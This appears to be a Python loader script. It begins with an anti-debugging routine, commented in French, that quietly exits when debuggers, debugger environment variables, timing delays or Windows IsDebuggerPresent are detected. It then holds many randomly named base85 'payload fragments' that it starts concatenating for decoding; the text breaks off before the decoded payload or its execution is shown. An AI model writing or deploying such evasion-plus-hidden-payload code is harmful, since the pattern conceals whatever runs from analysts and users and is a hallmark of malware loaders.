#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys as _sys
import os as _os
import time as _time

def _anti_debug_check():
    # Vérifie uniquement les debuggers interactifs réels (pas coverage/profile)
    _bad_modules = [
        'pydevd', '_pydev_bundle', 'pydevd_tracing', 'pydevd_plugins',
        'debugpy', 'pydevd_runfiles',
    ]
    for _m in _bad_modules:
        if _m in _sys.modules:
            _sys.exit(0)

    # Variables d'environnement de debuggers interactifs seulement
    _bad_env = [
        'PYDEVD_USE_FRAME_EVAL', 'PYCHARM_HOSTED',
        'DEBUGPY_LAUNCHER_PORT',
    ]
    for _e in _bad_env:
        if _os.environ.get(_e):
            _sys.exit(0)

    # Timing : seuil large (5s) pour éviter faux positifs sur machines lentes
    _t0 = _time.perf_counter()
    _x = 0
    for _i in range(5000):
        _x ^= _i
    _dt = _time.perf_counter() - _t0
    if _dt > 5.0:
        _sys.exit(0)

    # Windows uniquement : IsDebuggerPresent (API fiable, pas de faux positif)
    try:
        import ctypes
        if hasattr(ctypes, 'windll'):
            if ctypes.windll.kernel32.IsDebuggerPresent():
                _sys.exit(0)
    except Exception:
        pass

_anti_debug_check()
del _anti_debug_check

import sys as _sys

# ---- Payload fragments ----
_cs5S5QBd3X80cr = 'C!%(P5iJwuA7xGC{^?Y3yZ@x8x*NqZO6Bu<&ayTvOF3h%Iep+la`8Ouh=fYW3_NYL)U}H=(VF!YN8Dq3'
_cubCOkPAdoArxq = '89uk(NpohfW_M{%JZ&BfKW$sqJ<v19V|YPjbl&$e?G6uvJSrT(gfGtO%*>YDIL@8GkbSN^<HHQi$|VoS'
_ctpdWVa4yuqCop = ';BiHS>6(yGU1n)eez7FUh`Yug?L%p+rk_*Hu_aixTSr1L8f?ZjAFnw8tpGJ4?ExziOUTo@@*=ihl2W}8'
_cqGI3jBGnHN2Z5 = '#l({{YL1B0QXCpf`+FjWS~IHOm2W2&P7^vNfS9l0!AFDd1$#Y=7(<N_+i$@bq=yr9;&Y>1(>l%mW8EB;'
_cz09CvQ2edY9Gi = 'JunM`JVJP!ENcxxL^(_HWMWES<qY{WwScUaffO;bpg&lLdL%2t>ofV$7L<P(uD(Ab=X}6u4YEwI9yp_N'
_cjJn5z_HkNPBsi = 'o5P>Gh;d@GM`{0vHIO|UUa$W-Z@>fUGJFryZ2Yb~E1(z00+Jq3?z~2;slNicEyKZ5thm~MitOnMI!Me5'
_cquVJYDjSghxJA = 'h8ncw!2)+AV<gD=`fG$C{xHyFB;#wmBkbV%?#(i_pf0k=5IjNFjaDTY)g78^AnRN3jPl;+Y9x7ZB@S(C'
_caVBL3_rTf7sMB = 'd{Ug|J(E551ViU$CR^8;BW&^gl1al)XkR+h0+P95Cz;oic|~pPz9~nv;fOY}QDsHQPr2RpIH05b$klX*'
_cp_84UDX0QhyWX = 'ST_;}aJfDXH8;cs%ZI*)4l%q{bdK0TL*_DaN6G}`FR+}4FoX>U>RYYh#jD37vn(AF?iLMG62*upckfyA'
_clTbzLZ3LsoxUk = 'Y882|uo&amlBu)G622-(-bt@<&rfggUepf0AH~dQ@5LCmeP>-jY0wUQaYOI*k%Qk36(<5kr_SIw<nY$s'
_cx6XGGxl8PT_UY = 'w1ND+%&zERO7%{Z*L!z6uB+Wg3SxS|T^{#zKXLs+<$M94CnZF?f|<$&A3WxR?lT(St%%2|a>}O>C*Fho'
_cdbZ2zwGcU9FiI = 'DEui*_+p}q70Ja%#Iu4CXvM<L7V~GfCI~wfd$=7Y&8>t>k^M5Ox5Of>T%0MFy^HMG%>^V~deq$_asjza'
_cqnZKjkUs4vMtI = '%8vLEDK)gdSK;V8z3Hk5ehzL7YLL}s3A|LJcr1XszXlnuw^O^S4EkJMpQ0An($&Sfkb=^mflA$A1M$*j'
_cpfwchjGrCT5d_ = 'lGe-Ac{G`2(`zqvnC#c>U?_K~X?hABd`USWT#{M#Na)3$9Lr4<lMPY?g9~B!xsTjne3;6Kv3ELjBqUvZ'
_cmLcJzATaRwl2q = '5<Tcsk2>;U)@Rx+V9?dt4GL-2zE+Z5`ib2A&`{SSp-j0XXdkF9=J<0?Ab&7{)+eKlUA7}2f2OvdD&&Y{'
_ct3LsmwhreSFXW = 'goc}Z^+CV>bR#gUEYvnN-0s9%I1A&U8E<CKI(d$m>rRsB31wq#D$4Cn{ABw)S?48Sxc{uoYxjn52<8C9'
_cujRtWBExx8Fr2 = 'E_To`oi~BvGGv{CvBZhxSGr_mY1WGF)8j5H2P^ud6rXr($6szS$fUe}kwl;Vw&T@>o!-lAT7Ls^(OE8x'
_cxDsg4BcueIPBm = 'jG~ZZp(AM%j?n;s*Swy{i(ONhO7KXOJ8r?7vd~d(isLFCd=bh<VOqxXkUOIYGrZlPR-ob4FJ>ba!mzx?'
_cnOhbvWtYHqgfg = 'HQ*)^*&|}INU}Kz<!XbpTS#POoUj^fqEH;Z<S)*nYjD!T&2(TZ+LkHG4_we>I<6&Dq~p57o(w#|d)#7d'
_cwVrwe9GAZe1X_ = 'I6Ic{PZC1E7M?zB5t{gEhN8rb?WmX3S{zG7#Hbwzt7EXhCc9%VE}(6G^60O8%)AX$N8fW&f@m6<^1jkT'
_cisPBFqivRzPba = '>j{Q>ls`?J+9CY?=E~{nlrn1VGe77$lY1ImA%qu)VkYu7V@^W~dD=JyOA1L}8(t;xPH9}hQdNl$QFj40'
_ceNFDLeXp24S0C = '%~%k{Pva6|9#KH`Cm0{f;PpQmbr79d?O?2fk4`I1F%gvN#crhqhO03FHeNkVFkXNa2d?ESxs1tSZzsmC'
_cwcYZRMFWZwKf8 = 'd(*FmDjrK^r_mG5RE5_dj@h&@7h9h7M%fcq)YYh-g-|){>EdMsD{Dk|#_4b!i=ui51rP67rolT|&cbul'
_cuBbjLXfCXAeV5 = '&{29~a3go%-`EL9_6x0^TbCruXYA<ro^|Z6{b$Di8ym(s?_86+^-4yBpIyP#>ws_o)Jf2!M%Nxpc}F+l'
_cphFO0fUqGlBeb = 'xf(fmx5_cdMa{-Fe_Y5Ac>K6wsUWF;Olr6KRk50KyG|mrRY`9H*^a@~yibvcEBc!F>PvoHxJu|CNb_Z~'
_cfpm0sd0rPPZzU = 'VqnTv5uUm8c+&9S3;?__pLjnWH&ZvoUCvdCFZgsqQbB){#R6}+Kc4EKA@<*U4!s2PvQJ#kyz%cq_MDj6'
_cmV5fzIgAbkB3W = 'Ri&Ts)(pc&=&`uyPkB>E=^f&I3QM9@J_ah#t^aKLu!I+uW1gjrDgGYN(kT87W3Ul}cl9<3%HnzM<@<<~'
_cmH27jreYI9ze1 = 'BeLrga_T8_coxYYD<&b2fKMHIj>>|G?BdK;*YucEqz{EK{C(xk@`BK1O$7n^9~XA_cOBUSjo!%+Jbv;&'
_chgKCwgfFKC2lH = '{H2OI>9P|8v~N_zIWP9m)#71P8Z*5Z2C-Zapc53J*qD!sV^;$*=Gr~g7h@*X<eg*Z$S4fXd!Z#h0rLFt'
_c_Hqn9Wwmss203 = '``_j|!pAGvA-`z)ZgKacg*q$8TYg{e!{%<3C(@wZV+$spdcS~2Lu0w^;zkk}%3QrDA>=63oAcGj^Z#{Z'
_cdCGoTzMED9cJO = 'v&o9*eL4ZGkdAc20sM`n%%)m7*7?3&0yPvK(f|31IjaIpA_hE6ikGS0a>hdvmaUQt^|-Gu0m*6lDlMRk'
_cqVF2i2iBRRAfr = '0hMJpUh6$|)S;+OPW@w&Cx1O&d9$j|JNQ*bLT%s(@8yPb508aMqj;TZgPWUGp`^;P8ZMAuDle9pAhZum'
_cm9sEKndu92EMR = '=Jq>_cYu!}c!ybt0EQy_0&4A8@v3(7LfEutfUE<B{J}|N0B?F3;Wj*t-DKogFGgn=ITJ7si~T(*L`48;'
_cmDvPqBxYjxsNB = '@vE6*f%}v{Su_8JOp9Nvc4Fiz2s|PXelHd2s`uTW02uUAy;ZYSHnlnek}rACPZ{oK6o%q9rWu~z*WHwr'
_cyKnk0rMXmdrue = 'A&_<$zaTMKxR_b%=qNX*upzm!yke$jiMHJch5NiAZB$NDUtWITPk)+4B|T2MHzf}_@ozF>{u_wKOTm7O'
_ccIkMr9oEMrDVy = 'E0e|7qTON;3FFiVXc$Hj=P{jU6cDBJ$ps+jvNdxStl;2f#K4DhJyvU|&LDr^Xl3fY$KP9*mBL5%0p^<O'
_cewYG8jw0C9uDd = ';^vt{<<~6ciI00TaEl3=alQ+Z$?f-LM@}UEmkNl`p+&#sMwCgN=&T5dy%m#*dbd~UCwTbDrt@YL@Bea^'
_cwxKY51ua4f6fA = 'c4#T8B(ZiQ*wD|-Ku$|-iy4j9(drUWq~X788ZN{9v6ny<BT5U)zCxY9sbe*<7f|BeKi{3)U@EQX?*ie4'
_cp5W2ZD9SSirHk = '1-F{KbIt_T5fLEAK|+Iqs|?p_(E31a5&Ti~2n0x0)Em*K4N5^pREwEq*eJkXdoKO+gpqoe@zyn3-cg!V'
_ccTJOBF1wfxCIZ = '%FcdZlY}cJOma}fFy37?U^T2^*W=q(g33;mJ2$)KIh)1-iXMAn$^U5!cwmb_phA!T{V)OI*YtsthYrsz'
_cvDABum4xpe4s8 = '<KDlU7bi=G?$gUwKaBAj=hwvr<RBd-5vU}2D$Q7?<`R6Sl->;1&!lZ{QdU@9J_cTZup`E+M}e}ZFDl%&'
_cz_ec4CFn62k5e = '@t7&gr5Y4{l#itVbO37-gZHJ2^Z)WSW~D>r(njw6flof;N8M1JtjfpZVoX{9&%arhV%GzSf#y6B3)9xs'
_cqGhAumz0iMpdb = '4>E{o{-9|2g+oToPs@i@Ne@x1%n)^R;xr(jqOQ)BxoD)2f(xhz<jw=jM+~J~KEWN=-s6AoTc~X*FCi=O'
_cc8XlYNWQsSJdT = '1ES+>Ckq_((!US(#PuZJjgSNDYf_p#8X3PSrnNUaG)JwVJGpX${(2UAD5wq3zyRAoeiy)4CqKMD#dd*q'
_cxZrME_EeswiW5 = '5UHsVxH46y52ntSlA_8tJyU8FCbmi?_~DXh%i{yHFcoqB!sK;%j-ol(17Whl$Zaz{!rD*l8|q$Pw!c9m'
_cwpGIFXgQ_aNJd = 'Ov%Ya$b7<HJ0)S1A)Aj~bh2Q{uT0+E9Ty7n$!_woKz(vhwzV%`R9OlF@MGUaWz6j5nd<N2eY+qFtB_HP'
_cxfAy20sOdeuJh = 'C&8^oO(3A(I=lYwmh6h<cp6@L2z#h7q3FF^C%BgBdGHOWN1v#r=RP2DX~n{d15CGfWB?!g7+op6y|Pm!'
_cmiIsk_66stHxX = 'I%-Iti`5W9k65ZBq$xC11+-sLz3i1?Kmfe7r_5oMR!x;=rFW*fBbGfU3y_+k!rGY%Mq^4Whp3cG9o!2V'
_cxViv1Kq1A_tnd = 'egFZv@JtnF<T~}h4xrxLYPJRy+5AOs|E-SVg{9|f>_Z(X1${6O?>uxWA-U)hfFK<S5Hds)lIwobR$7q7'
_crD4Ykm0IcPooE = '+#6(Qq&6%+_RCeAZG|OD0xT(>&0ZBw+d>*;v+es=b76{AMy8MZaeavB9*W<~q+1&vXm((wrEiXAou|>V'
_co2RA48_JCTTFU = 'I0t%}(I=0hY_iX+)JW>K%SQXp)NZWRc(7PM`c7<>b-xmyKhi8K*f4#)FH%MeHpd5hH~G&>MgeXu5i3W6'
_cj1vpgrI5lvouF = 'q>ZRebPwZw*fJhV|KuL1o2W^uPZQX$d|ZZ>8;h_sG*C6=3T9-z^d#bjsg=?syOMjeS}T6FGMcq%)vBHq'
_c_GSlS2xp2tRGx = ')4Tx2quuq!zy}KAG}`1nJ?<`oagG{rMiw&@`&ramVv;TnRe7~&N+7e1AOtEE^{NH^>rl*=?`vJ65jb({'
_cs3XjAdN7ZTUNq = 'M2L-A*y#_2nE2qd)`Mb9peJ-z6sUjeyw^BgoQZPbMZ#)(y)UEOyJWhX-mYXNq29c84pM6_TM|2m0jSn?'
_cwOqPDwJxkhfV6 = 'sW=w4n>DNfa%}>`H>-(EK+dkjS<6CMe8<N$5^o>zL0!tmt^GO~AZ~g+@1-+7?iUsTw|D@dU?>J*y#o9z'
_cuPYNSnT7Xg5Za = '`*Ll)V)cH}1w0$rxBvRA2L<n-EAs4(O5Y%bKHK1#JpxjWjiDlr$nvBW92^b!36&;X+lpB|i7F*&lX*I8'
_cbW4LVF1A6Dyrc = 'Qy{n3XOCl86(zXftSLsP+OxEhdvP&9fZn3c$4HzHWvG};s=*w1(@Y@xMaoX~Vf5N1y&GSvL)))A$A_cc'
_cmULLmNAgzfeNu = '`63w`(zdk88#cDD4-PJueEJj8bnv3CqR3zS)?YS2p|Igr$5F_Sd>)0B00nQoL@=441kg46_l^Kgq<n$H'
_cweVQ0C6TPDMjR = 'vPo?&Pd4kIHR*Y?J8+r~wx41Q5^Bhvmhl#SY4N*7V9B|wAp2Fs;JOvvG};Q*oiEqdxc$YbVfu}EW>-82'
_cn68iIxP8wTpfM = 'I?fq%eO24B3U1SaZlUG$$%;Q@Ps@W}Q{-(R>bkr}=`xP#Hd>y9H1%GcL7%VAr@7>!jr=foEV{D#f5T<i'
_cbzqjpY18iCpC9 = '8o2_C5~ByY3EcH(Mt@LRgzJOJ(qaq=Fx>krj#))`JcP?PYWR?-k~h*2n+}6slz^<jN|)VDz5i?&$k!1@'
_cdDBfq_B21swut = 'NXiOsg?rfhVG>oZk+?nm7&<R+3kI;Df}`SfbMf_Ib-eBrSrru6_mP>VjF>1qHG2kXw>GK^b-C|H1KqVu'
_ctU508PKmekDav = 'Ji~{~?aYACeo^D-WXa<<fSg_`gf%Dyw=Ym4XRyk3+9^&BpoedpCQtiLYZsFPqZ58XkY}a7Q-W>YhtGwb'
_cqCB5rhR6RQVOi = 'o1>fLB`YiNDzRUC5CY#?o5AbMoxDlYs|Y}3xs#11Bz8uSDYb=`&d#d)e8TO47<%MaW2^ur@%3b>(IAA6'
_ca8CJjpqJSCT0Q = 'Ues2TMNM6&2FkHEwD_fj#r&6SnZ_zQPK5Vv?FntxYNAE{yDWn8f>x^&vyVjPise@UgCa&%q-vV9FPnA~'
_chxMF2M88ifSV5 = 'C?4)KFl?2oa0}+(2TTm;@ave>gJ_y_L+mWzFB!`(dGAN8rlx2*R$ovI@c6UJujSpW&qhK<1ezRO-h0c^'
_ciqJtQ1A91j4xg = 'S)r0Fm5n#|9d}!lId~M`*v{`ydn`?5jRzwRu@@Zh{z!^XQ<QV!kPUkO{P);SFX+Ujqye^RUxVD1`(8<u'
_cvkWuX6FdzZ1Fh = 'K~E>rvWcLr<SO_p#fyOQSAZsFYXu(9Qnk#f-HKbaIGaGTO0Isg=Yk9^x+0M7hD}U)Jq{#3a}p_KAg|1$'
_ca_oNgQmVlj82t = '0@(=CjDBZ<-lC3kx>eN<DOwsqML}FjKmfR`cEd`ud>a$W-qq*s-KPA9v~cm|O18kPw5aMpW{W$eDJ=PC'
_ctzq3P87iytIQA = ';8zeUJ!gouhhK^hrNt`oCLLv;=4XzER7&tp&OGv)CfJ3eNZKZS&s6FB%{5k&c<DO_#wIU=(U{PI%`n5<'
_ckzYXFgJUQZGXr = '#D>-1#`t^?b$FHN!=gg(7S>%}*ryejYZY4cU@ZFYDcQV|U#Q}a@>dti(Bk+PkY_h6Dry=)k0Ga_lx~Dy'
_cxh308cl_k2g0D = 'Wg`t?QI>PD9NgFIs4wNor@tl}RY*3PJEqrRUT<zQncJYxh{8lI3!57=gu&r}ytJF#RrK{lQFh&;R@Fd~'
_cmxvIwUKtPZifm = 'q3ZJEOvDi;08DGKNY`cr)oUd#e1NeaSospJRp_YMzdo%NIwlItFx?fHeJY9Ay4p$HsUa(vWu^L-MZ8=c'
_cwMFxDfObRXnc0 = 'mPNvY0tcoVJQsNw%WGwkW_#B^gko~YcOo}OUuO@?M#D|i%{GvKV9JDu1&Qh73s^_0b1Uk61o*@QeaUX#'
_ceZACuxjhv6mk6 = '>a=8JI`Gc1^2^SDa99%?%43Fi^(@#=*Nao;8P`Ec<@2r$QPq%}_qnK8O(CNo;1K?I{a0W&Pu5;;DO~7p'
_cp8qKN1uh02_JY = 'F=G;D0I~#mTqpqp`LzDx2+^?b8S#B!gL&JQ&afkLt`y<l(LP;Swy-@7TiU+UMRDbN%8@dIL)7apkF_pp'
_cze47ylDq6tfh3 = '@{BpA1JunG1v!IX_Bz{7b?-hxA%kCcIS9kaiipS{m~s)N?hi*aRWnm`m&KKXOGE#*@MBpkr^Q3*uclnb'
_cla1LCSPqxJ_0a = ';X5}gaEK0w5j8^gR%>$Cgv}ICdg$kt^MuWM^z?05<aY8uEsTCGutjy~Z*#bw&7XT}#nHlRq;698?R=~T'
_claz7HrRd0Fr5U = 'I?{I;FO{0%^hNyaNrekG{?}LUZg_=~#o~f~2%)q-hO;-SKor(Zu~BJ|)`umzm3O-)MTec}3pYhLpysgq'
_chTrHRjqIxEnyG = '(`cp>7nfJSK}U(sWgWELVh3m66Ifu75ne~nef8O-Gf$w+sihAT_(CeT;EstDV;EJ<oXka?fbe8Mw&hBM'
_cdOTu2CVvkI6UC = 'Uj#ae0};Ri%NtJUdl!)n5<z&gShI?W8e4kOX~gx%klDa8Y|Prq2f8PPbN^Kcg)-x21=wBSZ-+!;5TCm;'
_cbXglQ5IqmZQUa = 'EfBcCD9>rDDfr>kR!~iqn*%7018R0ax|%#n$>LS`H^Q-Iwo>ek*y0I6%dAhSM<|_!kDxF7d{s6Qmx96J'
_cgS9m2Y7BefnDS = 'bTW<t{yKbV>A<0aGgIZ;Q2lRe`&4@*r|)q7Gh5zmK0WqMs)wS5i++$FCPHJuXKhy!(X)VYAn*S3eR<|9'
_ckS_xFXtqNjEGR = 'AtJF$AKF)nO%IE(Nwe7$hcCqK(C%r3xLs(cTVcw9UXibrE9_w3+QFIpvw9fAAEYHt$#w=P|BRi0iYC5I'
_cno69XNxxFSbvl = 'm%oD<#Czumba*4yS<~L=wq;=ybN1*D7<dp|&gZf90*{kRAUen0IFi=R%`u`~92gwfbWIK3>*Oz9ql}T#'
_chAs9HDcLfVVMx = '(HDFCFNhQpM4Pr-gbwn{zE4@5iD*whd;NQ|C2%)grbD!cuoodR4*urxm}qpsF=e9s9V8oTaO0an6H8g_'
_cwdpPM70NQ0yHY = '(o%aM6qK(WL|Zc8)(Pj4S!xeo^T(TIrg9ty8rf2|*^%TSLqKi%jXzSGSpc&ri6?55Dbn%pLP@X-%_fV1'
_cpfpCIVk3OH3vs = '$dw;LGWTd%@FVWlIc})L{v5~K1NZ36C1pdgqE(0GEXbhZvox<Wafbt<B6i_KOXN52SezD2zdi}}><!0d'
_cy2M03d_2n9WvU = '-Yz{N3Bz4=@k-3!2vzFscW{98ayjmI>3~=Oo=%#M#Q_B33a^W|Rv&Jked*t9V&mwKup*MyHXMMQz}fQL'
_cwHz_4EMPs6K91 = '`6J);jF;M^O+@WLxE=<%(58*T`s&?-l<I+l9Xr6FyU1*7Ui9Y>>Ka%7f3=&{BN&ijVb`a9dT3CvuW_j1'
_cpcZmHPF4cV2Kf = 'CPBOAPcgUN57q4~b#@k9iAs_8g$BbbwX0<h>huCnmQ40*i$m_sCL->*(k)64GrnYpaPL5FGSHzLm<VZ5'
_cjt_FE08YdXYCn = '!DD1Xcjz1y+J5<gBzKo#F>X@v82qy4W6B?wuo7+C+NMLUg8+5I@udgI`K29$olhXkK!ROq9GjheKG+O+'
_crPtYCUuKzt6si = 'Ij`@&MU~C}@kHNwl-?fqzwiPi?Qf8;5Gz2Bx9_WAjFlMul#Ti`St%#rQsj033G?bA^&He`jK?HhdX2J9'
_czwWmtFkDcZOcd = 'wa%*!(_D=WGb(E#Q;cTF(_F%-P$7vrTq)>Rj=VmFn&)$`d`zLkI}G2jO%jY_>|=OgD9UbhB2>7s`u>W2'
_ca0_zvmuYXtlbU = 'RArwyB;0QlonxhrZSBdY<dhY&gK5k2GX#f$w!yyF_%(<tGimzKP(39v3#nQ4l-$rj8Nenxm=icJ;TNv{'
_clruOsmQxLCy_p = '#4d24=4zi)1EQs3sVZ|Tyq!Dz&W!EmXUxgflTXje>8ht41DoS9QMt)L9_mC25#kJsn%5T5)(XzWiVzq6'
_cnv3t0gAHvdV6s = 'Gq~;2?`v`)B2@Y&S;|aF_GIjE2Z8}YO`9`zB*9pq(1Ld@84O(7OJ+>DRbCzq9B6IoYo2A0Z|dHXC;yX@'
_cnMuztjB8Cqr_t = '{T+gYMpV`t9Lh75A)^lSt6e!@YOCYRi)1n6gn$-f8fl=RWs4)%eP8>3HN7neeY<>V#uhSl5hvWk=x2_$'
_ctnyhHywWc87xL = '@s5|vE5Q~mgn^L8kH(>r^sv5#j2kxoJG$uZuldp#Sh@N-%iL1Q$ke4`X&;@57Y4?A_oASK|AyF>O=?YM'
_cqX4r95qq5XHGH = '?BUAwz~#&2yLm$UV@g_R9bpt80Rj5Yrd~#WO;Pd_DbX(H=ONP$TKVN=pm^JTMws`b$0*Tk_7XfmJ<_Ij'
_cfufnY_P7Nzkrj = '4aZ=ho#;y(+YZKNc)#^l45>m1ly9)V{7yZm8?%Y(TqdhR*!J*Z6p<->{v_>%FhthDBeRG6G)aG4@Znwn'
_cs0BwtPhQOPmBb = 'B&<k{PN_ZDcqorpR1|vz%kDX+jgu?e!h=6`<@20LwpFqzs!49L3)7E|%Jvsx9!?T6fp|YlP;Q-3PA~w@'
_cwmBHZzgsnb78q = 'bD}FvPDNMhmEaktlH!RV-RLF#ptL!V$7aSzFk42;RW_7;i=K;T<f1W><9^>PFYxFi6Q27V#hNm#bNBW~'
_cgdv9jPljmPeXA = '7PG=UyM;jGoVfTM<nGPmZ@JUcFp8O3#7vad^Eb0@cu||2BU1YAz+@C^X!=+8>f1QZMR*HovSUN$*T=gP'
_caq1Etdto2kdf7 = 'pPkWvCT2xM@dro9aXkX7WeOBT7x|KDGmh}(()sjGjjvE+uukRb9;{@gK~`@iZQvqW-5$2@j-V{k65+Ql'
_cv1k8JVlFIE7Mx = 'QbhpH*v4b|qpPBfWe)yB>%@h=+^=C&Mw-yVN^`ZF!`f9RmIyEpoe_`dRtT37m1M|Kw%ifBPKpS3Y@>km'
_cr6gxSNMAIvz0S = '4-`t_f~e4@r+^kLQ9j<NC8c2RKKh-up34zA{AyYMMBE09jm_c^$U@*g<0!Zea=b5}V);Y|zBq<cF*({w'
_ceRMF1G_vqQkRi = 'l`N?%qyZtBFivV(r-uWh4mQIrw)N%?5Wg|SK$2+)w?_A|Da?fmmEj{?j9Xf_jn5*|mgb$7M2qBH3FWW|'
_cr08qGDQlmCW4L = 'ATX3SNY9{f9p#<A1tnd`F4<SY%Zx&ua>?X$TsR=$!%@J%P>+0@dV-at<)a*|lul}cRbWi#kPN#rXL@j?'
_curRIuuHaoHQlU = 'N&?#T81F;ci&IWQfYpsN(gL@HjTF6+Uq!W<)lfO7SSWVRRPg?HPCHsZ3zqOoS6JlfE<txipJ{v3`Z!wd'
_chMIwKC27apZ91 = 'RPK*O!5AT0lRpYQzYex^DVYgF-Dq!W1Pa~3eCWG|%n?QBi!4-0)KL`C?C!`NBPd~1R^$Dy{40Cm{?7xh'
_ceC8wpZwlmXV0w = ';+zMmBC`RT02axL47$~F?EX&83;2M3h!`!B$Zi2jgZFH5zttD(Okq63UHFHNmEqb=^DU^vQz_fi|95m!'
_czhY9h2UdW0oLv = '+WD*Lb7=?|t-x^@vn9nS<<*i#=X>s@UCHlGq0Puoa}RX@P$S)>9J+kT?f*r12SLqhwV&&ZjR*>PG^@Y8'
_ccvkGCNZygc9Pm = '8eGafgH)IQo4B;f_P-tZ3Gjj5VB^k*yu`t$=waW14J2)w?Y@7Z9#UaA8{6_RBG-)0%E1;Cb1??=u@U-L'
_cjfyLMkIOS29I4 = 'hXFRrGESOV+JhW1-8r==q5|L08Cyyg#720YHBrLGf~3vUk{VamfDz2JSsZ%IlZ3k7_ccPF4>i(#Oq@y-'
_cae8ejkkUPsn5d = 'HXS|*Z0SuEQ&`#j6UYv=u{Xo;=g%kOM2GALKA3UUFPk~RBvuz#V7lzCJSN0~1$d}-gPVc6o9?JN)6b34'
_cn1KOx2dvqGVK6 = 'uIjj~DzZ@?6INfAHSP49+<s?0m!Hm7-b`Z>;}Ki)zc!e$z)4xa!yqmKd1R2#xn;qqP!={tzyOddqcG3G'
_ceKrttZD91vJgH = '&(lz2Y&CUomRk6t5W!CTrp40BrACVlcwoDm+cOHXYP*)WYA{WUo)8r`7dl(!UDNEt90(k!XJFnUZ-M1u'
_cw67gN_5Uurv9m = '=sDb7MGb^YR^y<*-@vUP|D`^^kzC3%hFtD>L))LXI)jxF&|6Y&@Sqf<&7W){l>9%#RlON%BEBxuSxiDT'
_chhWeqH4wopm1O = 'FhW?LO01s`*m26K2N5NgO8x`|;+LO}jnX~%+v>dD;g(j2<Zr}d_NnCQbZLo6@Q&c$6|W3m!xd^ohjpsC'
_chiQxoP6aPp9ID = '%eOe@*?vkY>%&W}yn<?2zRNY6)rRyq8cZ0hyykf*S5a&q1G-#a{k0ZtbT>QrZU+ub&}w1Lpv2GQ9_U)3'
_cnsIAOj1apbtql = 'QU7N*+eRr~)P=b<7pnwgX_l6eJ7^0a+L@0MHJH1yT)ATkff2scQ?tkt5NZHPQu;uC(wM4-r<-%SCKR-P'
_crGdxJALcrG4Et = 'm7nV9NFO#Ywku1XIfa<(-m0U|=}JNVpv2Dr5VN=%S2)b)o#c5<>L#pt1~B+&H*OLo1mDK<F<l1(;;FaE'
_cgydO0eNCtTSvg = '{1E?wh0nt+GqiZ3Dxn7q`>0gB3Wq*IKx6TxCeW!}^Y_WwU^F&P^TSKMB9d`go8i&oW?4pfv_a<}*upqy'
_cx0PFiDykVS7JU = 'c{mEt^%`iCN3!z6WwA8Ywg!6!Lel45=Is?PUYkM0{K)gn2g<ap-}V;aN?w1sTs=#kHVSNa<O)~tzCY(P'
_cm4hPkKYlzPZpn = 'U<$f8H{83V8G0k6>q-YSd?{pr=7p$+dZ*lj=<xwRXN0@wICG|*k`q^+s*cc>ax=Hb1+2-S6&`(wZelh;'
_cc822gDYFQog7I = '-R%MC$>m^80_toA4@BT<2}|}*A8``@{5chIJMJbSA-w3>9jNiFo^u1DX-dJq-^d<-Cz${|w+c;IuWBXM'
_cw9uzs8k51sfOB = 'aHA@5Pt_9;qJ4q-E_7&Wt6E=};QZ=W@5I~IE)K1EoKRTUngc!LrGX{pYnoYM5X}^G3!@YXdbt(;S~ClG'
_cf7UylOENzXVym = '4bgWVC}yX3x?3RC;Xx)Rfh#G<>{3S-Z^JnV{lg|czcSit0$pS=bm_>e9{ozUXH#(Tp?Z{QYQtiq<&5qe'
_cj0qXjm7M7Zdq8 = '=BLp;I`pWhgm+Gt6ovWZzWG5gjiUa?IL*3L6k`f+-TPEI*BQLQ9c!DD?7RJjc-wPLnti*05N`W2xm%Ep'
_cly9lq0TqMUF9B = 'LTb&|9aw%%<@<|O<S6->T~Q(%cR+x=wA%``R2SL)K>m$&Z?IkOQwjZW1>@*R{o6ScdYHH)c$8yDh!CP7'
_cyGohFGGqRH_sY = '+$k~leOdORd^_ns?zr3-TM$mx0L;3^s~yYq3~XojKKrrRm}*i&6aT$E1-YdvP71W(6#V%k69nNPRTJnC'
_cv_6jZItNtpc5x = '+`ex*!@UG}*OvdohjrgG4%!70Np{g|cgGJ8i{nMJgVntwW|b6alBj7eNpFEKb(n9{oO8r(*Fvp9=Jwpu'
_cqqnT7iC7Mfl5y = 'B%)I@A43p$5{`)pY^PRDMvV_VKwT)#qx*)i19j+-TKf)c8+`1}k~>^Z51EIVS&9b4&zaRz$Dq(X(8eT6'
_cgZjzn5th2Nj1I = 'uv=*qawn?tWrc}Uj?%{5{pYmbaCH_t5jwE0H-rIT<U=b6egHa>l!G4XU0de&1kz`tg&I34_pCi*=ZI;K'
_coib9QsMVCRa_T = 'd*Q5)JItzDN^ZyU+zSXNUHDWpAVDxj(yVO9ECTQHO6v*1uyxWrG8uTQ{7S^fU1w2u5^gq0^ynhF9TwGE'
_cevTMvkN5e4sHE = '@&>^Q|MN%d2`1UUf{}OzbQs+-cvPOiS0b777p7u)qJ<2-tfkAOX>d<YOgk|I71_@4O{oGsia4o&MBzUH'
_csw2_x6m9vdB_9 = '*jtPW3V7c5P?iqV7;clHo=CbdI5`1BSCdagpN;DN_9@J#Ut=pmZ$Q(e0|XCJuXrpBP6Go*9k1{!As@Bk'
_chhh6TS51yAYRt = 'ZS?9bLu_<BB6~|7WT@~Yu^dlSxsq<s?=C&JvX>%7Aheoz0R*s8O`J~v%YFHBY1VDUyrm%84BfX3@WoBV'
_cntS9QfAz8jxq9 = 'h73`?Isz;CoOu^5y_^g{ub;SkeYJ{QDyA{T95rKAfXCm{gu4^%DzwxxDmVFU5cbSyS}}9F9JVd<<0(tR'
_cdnLwITBpwEWja = 'qEd{2^Tb6-lk|ev+_%MPFcT9Tq#&6~Ld66`TjttwwWodt1>yNjW;9P^hwsBt4r#29C6o`>mkc*k<|vuN'
_czZL0BVtvvMbBw = 'jDZZG@cM4!%64B`Dm=-jihxcK)6#-j'

_pjh2a_Vf2oTZk7 = __import__('base64').b85decode(_cs5S5QBd3X80cr + _cubCOkPAdoArxq + _ctpdWVa4yuqCop + _cqGI3jBGnHN2Z5 + _cz09CvQ2edY9Gi + _cjJn5z_HkNPBsi + _cquVJYDjSghxJA + _caVBL3_rTf7sMB + _cp_84UDX0QhyWX + _clTbzLZ3LsoxUk + _cx6XGGxl8PT_UY + _cdbZ2zwGcU9FiI + _cqnZKjkUs4vMtI + _cpfwchjGrCT5d_ + _cmLcJzATaRwl2q + _ct3LsmwhreSFXW + _cujRtWBExx8Fr2 + _cxDsg4BcueIPBm + _cnOhbvWtYHqgfg + _cwVrwe9GAZe1X_ + _cisPBFqivRzPba + _ceNFDLeXp24S0C + _cwcYZRMFWZwKf8 + _cuBbjLXfCXAeV5 + _cphFO0fUqGlBeb + 